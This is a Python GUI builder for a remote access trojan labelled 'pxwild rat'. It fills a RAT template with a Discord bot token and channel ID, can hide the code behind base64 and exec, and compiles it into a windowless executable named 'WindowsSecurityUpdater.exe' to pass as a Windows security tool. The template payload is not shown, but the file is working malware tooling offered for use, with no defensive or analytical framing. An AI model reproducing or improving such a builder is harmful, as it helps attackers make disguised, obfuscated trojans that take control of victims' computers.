import sys
import os
import re
import time
import base64
import subprocess
import shutil
import threading
import customtkinter
from PIL import Image

customtkinter.set_appearance_mode("Dark")
customtkinter.set_default_color_theme("blue")

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.dirname(__file__), relative_path)

class BuilderApp(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("pxwild rat")
        self.geometry("800x600")
        self.configure(fg_color="#000000")
        
        if os.name == 'nt':
            try:
                import ctypes as ct
                def dark_title_bar(window):
                    window.update()
                    DWMWA_USE_IMMERSIVE_DARK_MODE = 20
                    set_window_attribute = ct.windll.dwmapi.DwmSetWindowAttribute
                    get_parent = ct.windll.user32.GetParent
                    hwnd = get_parent(window.winfo_id())
                    rendering_policy = DWMWA_USE_IMMERSIVE_DARK_MODE
                    value = 1
                    value = ct.c_int(value)
                    set_window_attribute(hwnd, rendering_policy, ct.byref(value),
                                         ct.sizeof(value))
                dark_title_bar(self)
            except:
                pass
        
        self.logo_frames = []
        self.logo_frame_index = 0
        self.logo_frame_delay = 100
        
        try:
            logo_path = resource_path("Logo/logo.gif")
            pil_image = Image.open(logo_path)
            original_width, original_height = pil_image.size
            while True:
                frame = pil_image.copy()
                self.logo_frames.append(customtkinter.CTkImage(frame, size=(original_width, original_height)))
                try:
                    pil_image.seek(pil_image.tell() + 1)
                except EOFError:
                    break
            if pil_image.info.get('duration'):
                self.logo_frame_delay = pil_image.info['duration']
        except:
            self.logo_frames = None
        
        if self.logo_frames:
            self.logo_label_left = customtkinter.CTkLabel(self, image=self.logo_frames[0], text="")
            self.logo_label_left.place(x=20, y=20, anchor="nw")
            
            self.logo_label_right = customtkinter.CTkLabel(self, image=self.logo_frames[0], text="")
            self.logo_label_right.place(x=780, y=20, anchor="ne")
            
            self.animate_logo()
        
        self.center_frame = customtkinter.CTkFrame(self, fg_color="#000000")
        self.center_frame.place(relx=0.5, rely=0.5, anchor="center")
        self.center_frame.grid_columnconfigure(0, weight=1)
        
        self.title_label = customtkinter.CTkLabel(
            self.center_frame,
            text="pxwild rat",
            font=customtkinter.CTkFont(size=24, weight="bold"),
            text_color="#FFFFFF"
        )
        self.title_label.grid(row=0, column=0, pady=(20, 30), padx=40, sticky="ew")
        
        self.token_label = customtkinter.CTkLabel(
            self.center_frame,
            text="Discord Bot Token:",
            font=customtkinter.CTkFont(size=16),
            text_color="#FFFFFF"
        )
        self.token_label.grid(row=1, column=0, pady=(0, 5), padx=40, sticky="ew")
        
        self.token_entry = customtkinter.CTkEntry(
            self.center_frame,
            placeholder_text="Enter your Discord bot token...",
            text_color="#FFFFFF",
            fg_color="#1a1a1a",
            border_color="#FFFFFF",
            height=40
        )
        self.token_entry.grid(row=2, column=0, padx=40, pady=(0, 20), sticky="ew")
        
        self.channel_label = customtkinter.CTkLabel(
            self.center_frame,
            text="Discord Channel ID:",
            font=customtkinter.CTkFont(size=16),
            text_color="#FFFFFF"
        )
        self.channel_label.grid(row=3, column=0, pady=(0, 5), padx=40, sticky="ew")
        
        self.channel_entry = customtkinter.CTkEntry(
            self.center_frame,
            placeholder_text="Enter your Discord channel ID...",
            text_color="#FFFFFF",
            fg_color="#1a1a1a",
            border_color="#FFFFFF",
            height=40
        )
        self.channel_entry.grid(row=4, column=0, padx=40, pady=(0, 20), sticky="ew")
        
        options_frame = customtkinter.CTkFrame(self.center_frame, fg_color="#000000")
        options_frame.grid(row=5, column=0, pady=20, padx=40, sticky="ew")
        options_frame.grid_columnconfigure((0,1), weight=1)
        
        self.exe_var = customtkinter.StringVar(value="yes")
        self.exe_checkbox = customtkinter.CTkCheckBox(
            options_frame,
            text="Build as .exe",
            variable=self.exe_var,
            text_color="#FFFFFF",
            font=customtkinter.CTkFont(size=14)
        )
        self.exe_checkbox.grid(row=0, column=0, padx=10, pady=10)
        
        self.obfuscate_var = customtkinter.StringVar(value="no")
        self.obfuscate_checkbox = customtkinter.CTkCheckBox(
            options_frame,
            text="Obfuscate source code",
            variable=self.obfuscate_var,
            text_color="#FFFFFF",
            font=customtkinter.CTkFont(size=14)
        )
        self.obfuscate_checkbox.grid(row=0, column=1, padx=10, pady=10)
        
        self.build_button = customtkinter.CTkButton(
            self.center_frame,
            text="Build RAT",
            command=self.start_build_process,
            text_color="#000000",
            fg_color="#FFFFFF",
            hover_color="#CCCCCC",
            height=50,
            font=customtkinter.CTkFont(size=16, weight="bold")
        )
        self.build_button.grid(row=6, column=0, padx=40, pady=30, sticky="ew")
        
        self.progress_bar = customtkinter.CTkProgressBar(
            self.center_frame,
            progress_color="#FFFFFF",
            fg_color="#1a1a1a"
        )
        self.progress_bar.grid(row=7, column=0, padx=40, pady=(0, 20), sticky="ew")
        self.progress_bar.set(0)
        self.progress_bar.grid_remove()
        
        self.status_label = customtkinter.CTkLabel(
            self.center_frame,
            text="",
            font=customtkinter.CTkFont(size=12),
            text_color="#FFFFFF"
        )
        self.status_label.grid(row=8, column=0, padx=40, pady=(0, 20), sticky="ew")
        
        self.result_text = customtkinter.CTkTextbox(
            self.center_frame,
            text_color="#FFFFFF",
            fg_color="#1a1a1a",
            border_color="#FFFFFF"
        )
        self.result_text.grid(row=9, column=0, padx=40, pady=(0, 20), sticky="ew")
        self.result_text.grid_remove()
    
    def animate_logo(self):
        if self.logo_frames:
            self.logo_frame_index = (self.logo_frame_index + 1) % len(self.logo_frames)
            self.logo_label_left.configure(image=self.logo_frames[self.logo_frame_index])
            self.logo_label_right.configure(image=self.logo_frames[self.logo_frame_index])
            self.after(self.logo_frame_delay, self.animate_logo)
    
    def start_build_process(self):
        token = self.token_entry.get().strip()
        channel_id = self.channel_entry.get().strip()
        
        if not token or len(token) < 50:
            self.show_error("Invalid bot token format!")
            return
        
        if not channel_id.isdigit() or len(channel_id) < 15:
            self.show_error("Invalid channel ID format!")
            return
        
        self.build_button.configure(state="disabled")
        self.progress_bar.grid()
        self.progress_bar.set(0)
        self.status_label.configure(text="Starting build process...")
        
        thread = threading.Thread(target=self.build_rat, args=(token, channel_id))
        thread.daemon = True
        thread.start()
    
    def update_progress(self, value, status):
        self.progress_bar.set(value)
        self.status_label.configure(text=status)
    
    def show_error(self, message):
        self.status_label.configure(text=f"Error: {message}", text_color="#FF6B6B")
        self.build_button.configure(state="normal")
    
    def show_success(self, message):
        self.status_label.configure(text=message, text_color="#4ECDC4")
        self.build_button.configure(state="normal")
    
    def check_pyinstaller(self):
        try:
            subprocess.run([sys.executable, '-m', 'PyInstaller', '--version'], 
                          capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def install_pyinstaller(self):
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], 
                          capture_output=True, text=True, timeout=120)
            return True
        except:
            return False
    
    def build_executable(self, script_path):
        try:
            cmd = [sys.executable, '-m', 'PyInstaller', 
                   '--onefile', 
                   '--noconsole', 
                   '--name', 'WindowsSecurityUpdater',
                   '--icon', 'NONE',
                   script_path]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                exe_path = os.path.join('dist', 'WindowsSecurityUpdater.exe')
                if os.path.exists(exe_path):
                    return exe_path
            return None
        except:
            return None
    
    def build_rat(self, token, channel_id):
        try:
            self.update_progress(0.1, "Loading template...")
            template_path = resource_path("rat-code.py")
            output_path = "output.py"
            
            if not os.path.exists(template_path):
                self.show_error(f"Template file '{template_path}' not found!")
                return
            
            self.update_progress(0.2, "Configuring RAT...")
            with open(template_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content = re.sub(r"'{token}'", f"'{token}'", content)
            content = content.replace("{channel_id}", channel_id)
            
            if self.obfuscate_var.get() == "yes":
                self.update_progress(0.25, "Obfuscating source code...")
                code = content
                encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8')
                content = f"""import base64
exec(base64.b64decode('{encoded}'))"""
            
            if self.exe_var.get() == "yes":
                self.update_progress(0.3, "Checking PyInstaller...")
                if not self.check_pyinstaller():
                    self.update_progress(0.4, "Installing PyInstaller...")
                    if not self.install_pyinstaller():
                        self.show_error("Failed to install PyInstaller!")
                        return
                
                self.update_progress(0.5, "Creating temporary script...")
                temp_script = "temp_rat.py"
                with open(temp_script, 'w', encoding='utf-8') as f:
                    f.write(content)
                
                self.update_progress(0.6, "Building executable...")
                exe_path = self.build_executable(temp_script)
                
                try:
                    os.remove(temp_script)
                    if os.path.exists('build'):
                        shutil.rmtree('build')
                    if os.path.exists(temp_script.replace('.py', '.spec')):
                        os.remove(temp_script.replace('.py', '.spec'))
                except:
                    pass
                
                if exe_path and os.path.exists(exe_path):
                    self.update_progress(0.8, "Finalizing...")
                    final_path = "WindowsSecurityUpdater.exe"
                    shutil.move(exe_path, final_path)
                    
                    self.update_progress(1.0, "Build completed successfully!")
                    self.show_success("Build completed successfully!")
                    
                    self.result_text.grid()
                    result_text = f"""SUCCESS! Executable built successfully!
File: {os.path.abspath(final_path)}
Size: {os.path.getsize(final_path) / (1024*1024):.1f} MB"""
                    
                    self.result_text.delete("0.0", "end")
                    self.result_text.insert("0.0", result_text)
                else:
                    self.show_error("Build failed! Try manual build.")
                    with open(output_path, 'w', encoding='utf-8') as f:
                        f.write(content)
            else:
                self.update_progress(0.7, "Creating script...")
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                
                self.update_progress(1.0, "Script created successfully!")
                self.show_success("Script created successfully!")
                
                self.result_text.grid()
                result_text = f"""Successfully created RAT script!
File: {os.path.abspath(output_path)}"""
                
                self.result_text.delete("0.0", "end")
                self.result_text.insert("0.0", result_text)
                
        except Exception as e:
            self.show_error(f"Build failed: {str(e)}")

if __name__ == "__main__":
    app = BuilderApp()
    app.mainloop()
